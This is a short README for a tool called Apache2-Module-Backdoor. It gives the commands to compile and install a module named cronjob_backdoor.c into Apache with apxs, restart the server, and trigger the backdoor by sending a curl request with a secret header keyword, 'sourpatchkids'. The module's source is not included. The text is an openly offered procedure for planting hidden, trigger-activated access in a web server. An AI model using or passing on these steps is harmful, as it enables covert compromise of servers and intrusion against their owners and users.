# Apache2-Module-Backdoor


### Compiling the Module.

```
sudo apxs -i -a -c cronjob_backdoor.c
```
After compiling you need to restart the apache2 service by using the following command:
```
sudo service apache2 restart
```

### Triggering the BackDoor.
```
sudo curl -H "sourpatchkids: sourpatchkids " http://localhost
```
The keyword `sourpatchkids` needs to be in the header. Normal requests without the keyword wont trigger the code. 